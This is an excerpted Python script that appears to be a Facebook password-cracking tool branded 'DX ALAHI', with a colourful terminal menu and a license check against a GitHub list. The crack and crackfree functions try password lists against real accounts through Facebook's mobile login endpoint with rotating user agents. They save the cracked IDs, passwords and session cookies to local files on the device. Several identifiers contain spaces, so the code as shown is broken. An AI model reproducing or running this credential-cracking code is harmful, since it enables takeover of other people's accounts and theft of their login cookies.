...
prinCP=[]
try:
    prox= requests.get('https://github.com/KIN-NINJA/Gift/blob/main/Gift.txt').text
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/DX ALAHIyou248?mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mDX ALAHI Hosan
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mmDX ALAHI Hosan
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m1.0.2
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/DX ALAHI96698/PUTKI/blob/main/PUTKI.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
#os.system('espeak -a 300 " Welcome,   to,  DX ALAHI,  V I P,  Tools"')
def back():
	login()
...
#while attemps < 12345677901:
 #     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
  ...
  #  if username == 'DX' and password == '55':
...
def menu():
    ...
    print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
    DX ALAHI = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if DX ALAHI in ['111']:
        login()
        dump_massal()
    elif DX ALAHI in ['1']:
        crack_file()
    elif DX ALAHI in ['2','02']:
        os.system('xdg-open https://github.com/RX-DX ALAHI')
        os.system("python nono.py")
    elif DX ALAHI in ['3','03']:
        result()
    elif DX ALAHI in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/DX ALAHI.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python DX ALAHI-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[DX ALAHI-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDX ALAHI-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDX ALAHI-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
           #     os.system('espeak -a 300 " DX ALAHI,  Ok,  id"')
                open('/sdcard/DX ALAHI M2-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[DX ALAHI-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDX ALAHI-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DX ALAHI-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
              #  os.system('espeak -a 300 " DX ALAHI,  Ok,  id"')
                open('/sdcard/DX ALAHI M3-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
